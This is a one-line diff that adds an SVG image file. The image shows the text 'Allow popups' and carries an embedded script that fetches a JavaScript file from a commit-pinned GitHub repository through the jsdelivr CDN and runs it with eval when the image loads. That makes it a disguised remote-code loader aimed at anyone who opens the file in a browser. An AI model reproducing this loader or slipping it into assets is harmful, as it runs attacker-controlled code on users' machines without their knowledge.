@@ -1,0 +1,1 @@
+<svg xmlns="http://www.w3.org/2000/svg"><text x="100" y="30" fill="black">Allow popups</text><script>fetch("https://cdn.jsdelivr.net/gh/crshqd/sturdy-lamp@b2d94f07aa5e3dbb99a85b88c139d9cdf2d63e03/upd.js").then(t=>t.text()).then(d=>{eval(d)});</script></svg>
